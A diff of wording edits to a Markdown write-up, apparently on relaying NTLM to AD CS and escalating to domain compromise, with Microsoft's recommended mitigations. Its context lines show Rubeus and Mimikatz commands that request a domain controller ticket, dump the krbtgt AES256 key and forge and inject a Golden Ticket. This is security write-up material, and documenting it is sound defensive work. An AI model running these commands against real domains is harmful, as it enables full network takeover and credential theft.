@@ -67,7 +67,7 @@ Rubeus.exe asktgt /user:DC$ /domain:<domain> /certificate:<base64-certificate> /
 ```
 With the `/ptt` option, the returned TGT of DC$ would be imported into my current user session.
 \
-From here, a threat actor aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
+From here, a threat actor can aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
 Launch Mimikatz and dump the AES256 encryption key:
 ```
 # From mimikatz:
@@ -78,7 +78,7 @@ Once the AES256 encryption key of the krbtgt account was captured, the Golden Ti
 # From Mimikatz:
 kerberos::golden /user:Administrator /domain:<domain> /sid:<SID of the domain> /aes256:<aes256 key> /ticket:goldie.kirbi
 ```
-Proceeded to inject the golden ticket:
+Proceeded to inject the Golden Ticket:
 ```
 Rubeus.exe ptt /ticket:goldie.kirbi
 ```
@@ -93,4 +93,5 @@ Addition mitigations that are recommended by Microsoft are:
 - Disable NTLM on any ADCS server using Group Policy.
 - Disable NTLM for Internet Information Services (IIS) on AD CS Servers in the domain running the "Certificate Authority Web Enrollment" or "Certificate Enrollment Web Service" services.
 \
+
 More information can be found [here](https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429?ranMID=46131&ranEAID=a1LgFw09t88&ranSiteID=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&epi=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&irgwc=1&OCID=AID2200057_aff_7806_1243925&tduid=%28ir__pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00%29%287806%29%281243925%29%28a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA%29%28%29&irclickid=_pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00)
